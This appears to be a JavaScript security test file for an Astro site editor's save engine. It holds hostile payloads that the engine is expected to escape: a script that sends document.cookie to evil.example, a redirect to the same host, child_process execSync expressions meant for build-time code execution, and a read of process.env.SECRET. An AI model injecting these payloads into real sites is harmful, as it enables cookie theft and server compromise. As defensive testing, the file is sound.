// security.test.mjs — adversarial tests for the splice-back engine.
// Run: node tools/site-editor/security.test.mjs   (exit 0 = all pass)
//
// Threat model: an authenticated editor (or anyone who reaches the save API)
// submits hostile "text" for any editable block. The engine must guarantee the
// result is inert CONTENT — never markup, never an Astro expression, never a
// string-literal breakout — in every authoring context the sites use.

import assert from 'node:assert/strict';
import { extractPage, applyEdits, decodeEntities } from './extract.mjs';

let ran = 0;
function check(name, fn) { fn(); ran++; console.log('  ✓', name); }

// Re-extract after an edit and assert the block round-trips as plain text.
function saveAndReextract(source, blockPick, hostile) {
  const p1 = extractPage(source, 'x.astro');
  const b = p1.blocks.find(blockPick);
  assert.ok(b, 'target block found');
  const out = applyEdits(source, p1.blocks, [{ id: b.id, text: hostile }]);
  const p2 = extractPage(out, 'x.astro');
  const b2 = p2.blocks.find(blockPick);
  return { out, b2, p2 };
}

const PAGE = `---
const title = 'Safe Title';
const description = 'Safe description.';
---
<BaseLayout title={title} description={description}>
<section>
  <h1 class="rv">Hello there</h1>
  <p>Body text — fine.</p>
  <img src="/x.png" alt="A nice photo" />
  <CtaBand heading={\`Old heading\`} body={\`Old body\`} />
  <Fragment set:html={"<article><h2>Guide heading</h2><p>Guide body</p><a href=\\"/x\\" title=\\"hi\\">link</a></article>"} />
</section>
</BaseLayout>
`;

console.log('script/markup injection:');

check('<script> into a text block becomes inert entities', () => {
  const hostile = '</p><script>fetch("https://evil.example/"+document.cookie)</script><p>';
  const { out, b2 } = saveAndReextract(PAGE, (b) => b.label === 'h1', hostile);
  assert.ok(!/<script>fetch/.test(out), 'no live <script> tag in source');
  assert.ok(out.includes('&lt;script&gt;'), 'escaped as entities');
  assert.equal(b2.text, hostile, 'still displays verbatim in the editor');
});

check('Astro expression {…} into a text block is neutralized (build-time RCE vector)', () => {
  const hostile = "{(await import('node:child_process')).execSync('id')}";
  const { out, b2 } = saveAndReextract(PAGE, (b) => b.label === 'p', hostile);
  assert.ok(!/\{\(await/.test(out), 'no raw brace expression in template');
  assert.ok(out.includes('&#123;'), 'braces encoded');
  assert.equal(b2.text, hostile, 'displays verbatim in the editor');
});

check('attribute breakout via quotes is impossible (alt)', () => {
  const hostile = '" onmouseover="alert(1)" x="';
  const { out } = saveAndReextract(PAGE, (b) => b.label === 'img[alt]', hostile);
  assert.ok(!/onmouseover="alert/.test(out), 'no live event handler attribute');
  assert.ok(/alt="[^"]*"/.test(out), 'alt remains one quoted attribute');
});

console.log('component-prop (template literal) injection:');

check('backtick/interpolation breakout in CtaBand heading is escaped', () => {
  const hostile = '`}<script>1</script>{`${process.env.SECRET}';
  const { out } = saveAndReextract(PAGE, (b) => b.label === 'CtaBand[heading]', hostile);
  assert.ok(!out.includes('${process'), 'no live template interpolation');
  assert.ok(!/<script>1<\/script>/.test(out), 'no live script tag');
  const p2 = extractPage(out, 'x.astro');
  assert.ok(p2.blocks.find((b) => b.label === 'CtaBand[body]'), 'sibling prop intact');
});

console.log('set:html payload injection:');

check('string-literal breakout inside a set:html payload is escaped', () => {
  const hostile = '"}</Fragment><script>evil()</script><Fragment set:html={"';
  const { out } = saveAndReextract(PAGE, (b) => b.label === 'h2', hostile);
  assert.ok(!/<script>evil/.test(out), 'no live script in source');
  const p2 = extractPage(out, 'x.astro');
  assert.ok(p2.blocks.find((b) => b.label === 'p' && b.kind === 'shtml'), 'payload structure intact');
});

console.log('frontmatter / JSON-LD injection:');

check('</script> via SEO title cannot break out of a JSON-LD block', () => {
  const hostile = '</script><script>document.location="https://evil.example"</script>';
  const { out } = saveAndReextract(PAGE, (b) => b.label === 'title', hostile);
  assert.ok(!out.includes('</script>'), 'no literal close-tag anywhere in the literal');
  assert.ok(out.includes('\\u003c/script\\u003e'), 'angle brackets \\u-escaped in the JS string');
  // and the string still means the same thing at runtime:
  const p2 = extractPage(out, 'x.astro');
  assert.equal(p2.blocks.find((b) => b.label === 'title').text, hostile);
});

check("quote breakout in a single-quoted frontmatter const is escaped", () => {
  const hostile = "x'; import { execSync } from 'node:child_process'; const y = '";
  const { out, b2 } = saveAndReextract(PAGE, (b) => b.label === 'description', hostile);
  assert.ok(out.includes("\\'"), 'quotes escaped inside the literal');
  // The literal was not terminated early: the whole hostile text is still ONE
  // string (inert content), so it round-trips verbatim through re-extraction.
  assert.equal(b2.text, hostile, 'entire payload stayed inside the string literal');
  assert.equal(extractPage(out, 'x.astro').blocks.length,
    extractPage(PAGE, 'x.astro').blocks.length, 'no new statements/blocks appeared');
});

console.log('integrity:');

check('hostile edits still build a structurally identical page', () => {
  const p1 = extractPage(PAGE, 'x.astro');
  const edits = p1.blocks.map((b) => ({ id: b.id, text: '</p>{evil}<script>"\'`${x}' }));
  const out = applyEdits(PAGE, p1.blocks, edits);
  const p2 = extractPage(out, 'x.astro');
  assert.equal(p2.blocks.length, p1.blocks.length, 'same block count');
  assert.deepEqual(
    p2.blocks.map((b) => [b.kind, b.label]),
    p1.blocks.map((b) => [b.kind, b.label]),
    'same block kinds/labels in the same order'
  );
});

check('editing with unchanged text is byte-identical (no-op save)', () => {
  // Unchanged blocks are never re-encoded — the API only sends dirty blocks —
  // so a save that touches nothing must leave every byte alone.
  const out = applyEdits(PAGE, extractPage(PAGE, 'x.astro').blocks, []);
  assert.equal(out, PAGE);
});

check('braces round-trip: user sees {, file stores &#123;', () => {
  const { out, b2 } = saveAndReextract(PAGE, (b) => b.label === 'h1', 'use {curly} braces');
  assert.ok(out.includes('&#123;curly&#125;'));
  assert.equal(b2.text, 'use {curly} braces');
  assert.equal(decodeEntities('&#123;x&#125;'), '{x}');
});

console.log(`\nall ${ran} security tests passed`);
